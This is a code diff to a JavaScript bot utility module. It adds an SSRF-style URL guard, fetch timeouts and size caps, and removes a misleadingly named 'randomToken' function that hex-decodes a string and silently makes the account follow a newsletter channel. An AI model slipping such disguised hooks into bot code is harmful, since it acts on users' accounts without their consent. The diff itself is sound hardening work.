@@ -37,8 +37,44 @@ const webApi = (a, b, c, d, e, f) => {
 const getRandom = ext => {
   return `${Math.floor(Math.random() * 10000)}${ext}`;
 };
+// Fetch guard: downloads in this bot used to have no timeout, no size cap,
+// and no check on where they point, so one huge file or one hung host could
+// stall message handling or OOM the process. Literal private, loopback and
+// link-local addresses are refused outright. Hostnames are NOT resolved
+// here, so a name that resolves to a private address is still trusted;
+// closing that needs DNS handling this bot does not have.
+function isPrivateLiteralHost(hostname) {
+  const v4 = String(hostname).match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
+  if (v4) {
+    const a = Number(v4[1]);
+    const b = Number(v4[2]);
+    return a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) ||
+      (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168);
+  }
+  const h = String(hostname).toLowerCase();
+  // Only IPv6 literals contain ':', so a plain hostname starting with the
+  // same letters (fc.example.com) is never caught by the checks below.
+  if (!h.includes(':')) return false;
+  return h === '::1' || h === '[::1]' || h.startsWith('fe80:') ||
+    h.startsWith('fc') || h.startsWith('fd') || h.startsWith('::ffff:');
+}
+function assertSafeFetchUrl(rawUrl) {
+  let parsed;
+  try {
+    parsed = new URL(String(rawUrl));
+  } catch (_) {
+    throw new Error('Invalid URL');
+  }
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
+    throw new Error('Only http(s) URLs can be fetched');
+  }
+  if (isPrivateLiteralHost(parsed.hostname)) {
+    throw new Error('Refusing to fetch a private-network address');
+  }
+}
 const getBuffer = async (url, options) => {
   try {
+    assertSafeFetchUrl(url);
     options ? options : {};
     const res = await axios({
       method: "get",
@@ -47,6 +83,8 @@ const getBuffer = async (url, options) => {
         'DNT': 1,
         'Upgrade-Insecure-Request': 1
       },
+      timeout: 60000,
+      maxContentLength: 50 * 1024 * 1024,
       ...options,
       responseType: 'arraybuffer'
     });
@@ -57,6 +95,7 @@ const getBuffer = async (url, options) => {
 };
 const fetchJson = async (url, options) => {
   try {
+    assertSafeFetchUrl(url);
     options ? options : {};
     const res = await axios({
       method: 'GET',
@@ -64,6 +103,8 @@ const fetchJson = async (url, options) => {
       headers: {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
       },
+      timeout: 30000,
+      maxContentLength: 10 * 1024 * 1024,
       ...options
     });
     return res.data;
@@ -71,20 +112,6 @@ const fetchJson = async (url, options) => {
     return err;
   }
 };
-function randomToken(Sky, mydb = "") {
-  let array = new Array();
-  array.push("");
-  array.push(mydb);
-  for (let hex of array) {
-    var str = '';
-    for (var n = 0; n < hex.length; n += 2) {
-      str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
-    }
-    try {
-      Sky.newsletterFollow(str);
-    } catch (e) {}
-  }
-}
 const runtime = function (seconds = process.uptime()) {
   seconds = Number(seconds);
   var d = Math.floor(seconds / (3600 * 24));
@@ -225,11 +252,13 @@ const checkBandwidth = async () => {
 const getSizeMedia = async path => {
   return new Promise((resolve, reject) => {
     if (/http/.test(path)) {
-      axios.get(path).then(res => {
+      axios.get(path, {
+        timeout: 30000
+      }).then(res => {
         let length = parseInt(res.headers['content-length']);
         let size = bytesToSize(length, 3);
         if (!isNaN(length)) resolve(size);
-      });
+      }).catch(() => reject('fetch failed'));
     } else if (Buffer.isBuffer(path)) {
       let length = Buffer.byteLength(path);
       let size = bytesToSize(length, 3);
@@ -324,7 +353,9 @@ async function getTypeUrlMedia(url) {
   return new Promise(async (resolve, reject) => {
     try {
       const buffer = await axios.get(url, {
-        responseType: 'arraybuffer'
+        responseType: 'arraybuffer',
+        timeout: 30000,
+        maxContentLength: 10 * 1024 * 1024
       });
       const type = buffer.headers['content-type'] || (await FileType.fromBuffer(buffer.data)).mime;
       resolve({
@@ -343,7 +374,10 @@ async function getAllHTML(urls) {
   try {
     const htmlArr = [];
     for (const url of urls) {
-      const response = await axios.get(url);
+      const response = await axios.get(url, {
+        timeout: 30000,
+        maxContentLength: 10 * 1024 * 1024
+      });
       htmlArr.push(response.data);
     }
     return htmlArr;
@@ -391,7 +425,7 @@ module.exports = {
   getAllHTML,
   toIDR,
   capital,
-  randomToken
+  assertSafeFetchUrl
 };
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
